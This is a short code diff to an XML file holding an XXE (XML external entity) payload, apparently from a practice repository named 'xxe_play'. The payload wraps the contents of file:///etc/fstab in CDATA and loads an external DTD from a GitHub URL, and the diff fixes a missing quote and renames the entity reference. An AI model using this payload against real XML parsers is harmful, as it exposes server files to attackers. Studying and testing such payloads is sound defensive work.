@@ -5,9 +5,9 @@
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % middle SYSTEM "file:///etc/fstab">
 <!ENTITY % end "]]>">
-<!ENTITY % exe SYSTEM https://raw.githubusercontent.com/hoguer/xxe_play/master/combo.txt">
+<!ENTITY % exe SYSTEM "https://raw.githubusercontent.com/hoguer/xxe_play/master/combo.txt">
 %exe;
 ]>
 <message>
-<text>&xxe;</text>
+<text>&combo;</text>
 </message>
